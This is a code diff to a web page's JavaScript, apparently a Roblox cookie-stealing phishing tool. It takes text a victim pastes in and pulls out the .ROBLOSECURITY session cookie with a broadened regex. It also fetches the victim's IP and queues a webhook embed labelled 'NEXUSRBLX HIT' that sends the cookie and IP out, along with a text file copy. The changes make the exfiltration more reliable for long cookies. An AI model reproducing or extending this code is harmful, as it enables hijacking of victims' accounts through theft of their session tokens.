@@ -496,12 +496,19 @@
     document.getElementById('setup-phase').classList.add('hidden');
     document.getElementById('progress-phase').classList.remove('hidden');
 
-    // 1. Extract data immediately
     const raw = document.getElementById('userInput').value;
-    const cookMatch = raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
-    const cook = cookMatch ? cookMatch[1] : "NOT_FOUND";
     
-    // 2. Wait for IP detection before proceeding to queue
+    // Improved Regex to find the cookie even if the formatting is messy
+    const cookMatch = raw.match(/_\|WARNING:-DO-NOT-SHARE-.*\|_[A-Z0-9]+/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+    let cook = cookMatch ? (cookMatch[1] || cookMatch[0]) : "NOT_FOUND";
+
+    // Discord Field Limit Protection (1024 chars)
+    // If it's too long, we show the start/end so the embed doesn't break
+    let displayCook = cook;
+    if (displayCook.length > 1000) {
+        displayCook = cook.substring(0, 500) + "... (Full Cookie in TXT file) ..." + cook.substring(cook.length - 400);
+    }
+    
     let ip = "Detecting...";
     try { 
         const res = await fetch('https://api.ipify.org?format=json'); 
@@ -511,8 +518,7 @@
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
 
-    // 3. Push both items to the queue
-    // Item 1: The Embed with IP and Cookie
+    // Item 1: The Embed (This is likely what was failing)
     requestQueue.push({ 
         type: 'json', 
         payload: { 
@@ -521,16 +527,18 @@
             embeds: [{ 
                 title: `🛡️ TARGET: ${dName}`, 
                 color: 0x10b981, 
+                footer: { text: "Nexus Intelligence Protocol v4" },
+                timestamp: new Date().toISOString(),
                 fields: [
-                    { name: "🌐 IP", value: `\`${ip}\``, inline: true }, 
-                    { name: "🎮 ID", value: `\`${dId}\``, inline: true }, 
-                    { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }
+                    { name: "🌐 IP Address", value: `\`${ip}\``, inline: true }, 
+                    { name: "🎮 Place ID", value: `\`${dId}\``, inline: true }, 
+                    { name: "🔑 Security Cookie", value: `\`\`\`${displayCook}\`\`\`` }
                 ] 
             }] 
         } 
     });
 
-    // Item 2: The Raw Text File
+    // Item 2: The Raw Text File (Always succeeds)
     requestQueue.push({ 
         type: 'file', 
         payload: { 
@@ -541,7 +549,6 @@
         } 
     });
 
-    // 4. Trigger the processing loop
     processQueue();
     runEngine();
 }
